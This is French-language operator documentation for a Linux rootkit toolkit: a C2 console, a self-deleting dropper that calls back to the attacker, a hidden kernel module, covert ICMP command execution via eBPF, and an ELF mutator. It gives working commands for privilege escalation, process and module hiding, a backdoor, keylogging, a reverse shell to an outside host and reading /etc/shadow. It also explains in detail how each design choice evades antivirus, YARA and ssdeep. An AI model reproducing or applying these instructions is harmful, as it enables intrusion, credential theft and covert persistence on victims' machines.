# Documentation d'utilisation

## Architecture

```
c2 Console opérateur (REPL interactif)
metamorph Mutateur ELF (obfuscation binaire)
rootkit_module Module noyau + companion + dropper
ebpf Canal C2 covert via XDP/ICMP
build-sys-linux Système de build kernel
```

---

## 1. Prérequis

```bash
sudo apt install build-essential linux-headers-$(uname -r) clang libbpf-dev libelf-dev

uname -r   # ex: 6.19.9
```

---

## 2. Build

### 2.1 Module noyau (sur la machine attaquante, pour le kernel cible)

```bash
cd rootkit_module

# Première fois : installer les headers du kernel cible
make setup TARGET=6.19.9

# Compiler le module + companion + renommage aléatoire
make modules       
make userspace    
```

Le module est renommé aléatoirement à chaque build (ex: `network-proxy-agent.ko`).
Le fichier `.rk_name` contient le nom généré — utilisé par le C2.

### 2.2 Dropper (stage-1)

```bash
# Compiler le dropper statique (pour la cible)
make dropper C2=<IP_attaquant> PORT=4444
```

Produit `dropper` : un binaire statique qui se connecte au C2, reçoit le .ko, le charge, puis s'auto-supprime.

### 2.3 C2

```bash
cd c2
make
./c2
```

### 2.4 Metamorph

```bash
cd metamorph
make
```

---

## 3. Déploiement sans C2 (manuel)

Si la machine cible est accessible directement (réseau local, accès physique, partage de fichiers), le module peut être déployé sans passer par le C2.

### 3.1 Compiler sur la machine attaquante

```bash
cd rootkit_module

# Compiler pour le kernel de la cible (ex: 6.12.79-0-virt)
make modules KVER=6.12.79-0-virt
make userspace

# Le .ko est renommé aléatoirement — le nom est dans .rk_name
cat .rk_name     # ex: disk-agent-handler
cat .rk_bin_name # ex: session-monitor
```

> Si le build-sys du kernel cible n'est pas présent, placer les headers dans `build-sys-linux-<KVER>/` (voir section 2.1).

### 3.2 Transférer et charger sur la cible

```bash
# Transférer (ex: via scp, clé USB, disque partagé)
scp $(cat .rk_name).ko user@cible:/tmp/
scp $(cat .rk_bin_name) user@cible:/tmp/

# Sur la cible : charger le module
insmod /tmp/$(cat .rk_name).ko

# Vérifier
lsmod | grep -v "^Module"
```

### 3.3 Contrôle via companion

```bash
# Le companion est le binaire userspace (nom aléatoire)
/tmp/<nom_bin> uid
/tmp/<nom_bin> hide_mod
# etc. (voir section 5)
```

---

## 4. Déploiement avec le C2 (automatisé)

Le C2 automatise tout le pipeline : attente du dropper, compilation du .ko pour le bon kernel, mutation ELF, livraison et chargement. Un seul socket TCP est utilisé entre le dropper et le C2.

### Prérequis côté attaquant

```bash
# Builder C2 + metamorph
cd c2 && make
cd ../metamorph && make metamorph

# Headers du kernel cible dans build-sys-linux-<KVER>/
# (télécharger le package linux-*-dev de la distro cible)
```

### Prérequis côté cible

Le dropper doit être compilé pour la libc de la cible :

```bash
# Sur la cible (ou cross-compilé) :
gcc -o dropper dropper.c obfs.c -DC2_HOST=\"<IP_attaquant>\" -DC2_PORT=4444
```

### Lancer le C2

Lance la console interactive :

```
  ██████╗██████╗
 ██╔════╝╚════██╗
 ██║      █████╔╝
 ██║     ██╔═══╝
 ╚██████╗███████╗
  ╚═════╝╚══════╝
  rootkit command & control

[c2] >
```

### Commandes REPL

| Commande | Description |
|---|---|
| `set <option> <valeur>` | Configurer une option |
| `show options` | Afficher la configuration |
| `show protocols` | Lister les protocoles |
| `run` | Lancer le pipeline complet |
| `exec <cmd>` | Envoyer une commande via ICMP covert (eBPF) |
| `help` | Aide |
| `exit` | Quitter |

### Options

| Option | Défaut | Description |
|---|---|---|
| `TARGET` | — | IP de la cible |
| `PORT` | 4444 | Port de livraison |
| `LPORT` | 4444 | Port d'écoute dropper callback |
| `PROTOCOL` | tcp | Protocole : `tcp` / `icmp` / `http` / `dns` |
| `KVER` | auto | Forcer la version kernel (si pas de dropper) |

### Workflow complet (TCP)

```
[c2] > set TARGET 192.168.1.100
[c2] > set LPORT 4444
[c2] > run
```

Le C2 :
1. Attend le callback du dropper (connexion entrante sur LPORT)
2. Reçoit la version kernel depuis le dropper
3. Compile le .ko pour cette version (`make modules KVER=<ver>`)
4. Applique metamorph (mutations ELF)
5. Envoie le .ko sur le même socket (réutilisation de connexion)
6. Le dropper charge le .ko via `finit_module` puis s'auto-supprime

### Workflow sans dropper (ICMP/DNS)

```
[c2] > set TARGET 192.168.1.100
[c2] > set PROTOCOL icmp
[c2] > set KVER 6.19.9
[c2] > run
```

KVER doit être renseigné manuellement car ICMP/DNS n'ont pas de callback bidirectionnel.

### Commandes post-exploitation via eBPF (ICMP covert)

Le module eBPF XDP intercepte les paquets ICMP contenant le magic `0xDEAD1337` et exécute la commande embarquée. Le paquet est ensuite droppé — invisible au stack réseau.

```
[c2] > set TARGET 192.168.1.100
[c2] > exec id > /tmp/.rk_out
[+] exec → 192.168.1.100 : id > /tmp/.rk_out

[c2] > exec cat /etc/shadow >> /tmp/.rk_out
```

---

## 5. Companion (contrôle du rootkit)

Le companion `rootkit_malware` contrôle le module depuis la cible :

```bash
./rootkit_malware uid                        # UID courant
./rootkit_malware privesc_cmd "id"           # Exécuter commande en root
./rootkit_malware hide_pid 1234              # Cacher un PID de /proc
./rootkit_malware unhide_pid 1234
./rootkit_malware hide_mod                   # Disparaître de lsmod
./rootkit_malware show_mod
./rootkit_malware backdoor 9999              # Ouvrir backdoor TCP sur port 9999
./rootkit_malware backdoor_pass monpass      # Mot de passe backdoor
./rootkit_malware keylog_toggle              # Activer/désactiver keylogger
./rootkit_malware keylog_read                # Lire le buffer keylogger
./rootkit_malware hide_user root             # Cacher un user de /etc/passwd
./rootkit_malware protect /etc/rc.local      # Protéger un fichier contre rm
./rootkit_malware revshell 192.168.1.10:4444 # Reverse shell
./rootkit_malware toggle                     # Toggle rootkit via signal 63
```

---

## 6. eBPF

Trois programmes eBPF indépendants du module kernel.

### Prérequis

```bash
sudo apt install clang libbpf-dev
make ebpf   # compile les 3 programmes + le loader
```

### 6.1 Canal C2 covert ICMP (`icmp_c2.bpf.c`)

Intercepte les paquets ICMP Echo Request contenant le magic `0xDEAD1337`. La commande embarquée dans le payload est exécutée sur la cible. Le paquet est droppé — invisible au stack réseau et à tcpdump.

**Via le C2 (recommandé) :**
```
[c2] > set TARGET 192.168.1.100
[c2] > exec id > /tmp/.rk_out
[c2] > exec cat /etc/shadow >> /tmp/.rk_out
```

**Manuellement (raw socket) :**
```python
import struct, socket
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
magic = struct.pack('!I', 0xDEAD1337)
cmd   = b'id > /tmp/.rk_out'
icmp  = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + magic + cmd
s.sendto(icmp, ('<IP_cible>', 0))
```

### 6.2 Masquage réseau XDP (`xdp_hide.bpf.c`)

Cache les paquets sur un port au niveau driver — avant même que le kernel IP stack les voie. Tcpdump ne les voit pas.

```bash
sudo ./ebpf/rk_ebpf_loader xdp_attach eth0
sudo ./ebpf/rk_ebpf_loader xdp_hide_port 9999
sudo ./ebpf/rk_ebpf_loader xdp_enable

# Retirer
sudo ./ebpf/rk_ebpf_loader xdp_detach eth0
```

### 6.3 Monitoring execve (`exec_monitor.bpf.c`)

Monitore tous les `execve` sur la machine en temps réel. Utile pour observer l'activité post-exploitation ou détecter des contre-mesures.

```bash
sudo ./ebpf/rk_ebpf_loader exec_monitor
```

---

## 8. Metamorph seul

```bash
# Sur un binaire userspace
./metamorph <input> <output>

# Sur un module kernel
./metamorph <input> <output> --ko
```

Transforms appliquées :
- **strip** : supprime symboles de debug
- **build-id** : randomise le hash GNU build-id
- **bss-pad** : augmente .bss de N octets aléatoires
- **.comment** : remplace la version GCC par une fausse
- **rename-syms** : renomme les symboles locaux en `_fXXXX`
- **dead-code** : injecte de fausses fonctions x86-64 dans .text (binaires uniquement)
- **nuke-shdrs** : efface la section header table (binaires uniquement)
- **timestamps** : forge mtime/atime entre -6 et -18 mois

---

## 9. Pourquoi ces choix

### Obfuscation des strings (obfs.h / obfs.c)

Les strings sensibles (`/tmp/.rk_cmd`, `/proc/modules`, `kallsyms_lookup_name`...) sont stockées XOR'd dans `.rodata`. L'outil `strings` ou un scan statique ne les voit pas. Elles sont décodées sur la stack au moment de l'appel via `DEOBFS()`, puis disparaissent à la fin du bloc.  
**Alternative rejetée :** chiffrement RSA ou AES — trop lourd pour du code noyau, inutile pour des strings courtes.

### Metamorph (mutations ELF)

Chaque build produit un binaire différent : build-id unique, symboles renommés, faux code injecté, timestamps falsifiés. Deux exécutions sur deux cibles différentes donnent deux binaires que les outils de corrélation (YARA, ssdeep) ne pourront pas associer.  
**Alternative rejetée :** packer UPX — détecté par signature immédiatement.

### C2 interactif multi-protocole

Un seul outil unifie build, mutation et livraison. Le protocole est sélectionnable à l'exécution (TCP direct, ICMP covert, HTTP firmware, DNS TXT). Le socket dropper est réutilisé pour la livraison du .ko — une seule connexion sortante sur la cible, pas deux.  
**Alternative rejetée :** script Python ou Bash — non portable, facilement détectable par les AV, pas de gestion d'état.
